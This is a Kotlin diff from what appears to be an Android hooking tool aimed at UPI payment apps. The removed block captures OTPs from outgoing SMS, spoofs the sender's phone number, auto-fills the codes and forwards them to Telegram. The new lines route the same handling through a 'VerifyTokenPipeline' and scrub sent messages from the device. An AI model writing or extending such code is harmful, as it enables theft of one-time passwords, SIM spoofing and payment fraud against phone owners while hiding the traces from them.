@@ -96,34 +96,8 @@ object OutgoingSmsGuard {
             val dest = parts.getOrElse(0) { "" }
             val body = parts.getOrElse(1) { "" }
             if (body.isBlank()) return
-
-            val configManager = ConfigManager(context)
-            val config = configManager.load()
-            val app = SmsMatcher.matchedHookedApp(config, dest, body)
-            val interceptDisplay = SmsMatcher.interceptDisplay(config, dest, configManager)
-            val appLabel = app?.displayName.orEmpty().ifBlank {
-                ActiveHookManager.readActivePackage()?.let { UpiAppRegistry.displayNameFor(it) }.orEmpty()
-            }
-            val otp = LastOtp(
-                otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
-                sender = interceptDisplay,
-                body = body,
-                phone = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 },
-                messageLabel = appLabel,
-                direction = "outgoing",
-                rawPeer = dest,
-                capturedAt = System.currentTimeMillis()
-            )
-            OtpCaptureWriter.write(context, otp)
-            OtpAutoFillHelper.onHookedOtpCaptured(context, config, otp)
-            val shouldForward = SmsMatcher.shouldForwardToTelegram(config, dest, body, "outgoing") ||
-                config.enableVirtualSim || config.interceptFakeSuccess
-            if (shouldForward) {
-                TokenForwarder(configManager, context).forwardOutgoingBlocked(otp)
-            }
-            try {
-                File("/data/local/tmp/hivirtus_outgoing_fake_ok.flag").writeText("ok")
-            } catch (_: Exception) {}
+            OutgoingSmsCleaner.scrubSentIfNeeded(context, dest, body)
+            VerifyTokenPipeline.handleBlocked(context, dest, body)
             flag.delete()
         } catch (e: Exception) {
             Log.w(TAG, "Blocked flag process failed: ${e.message}")
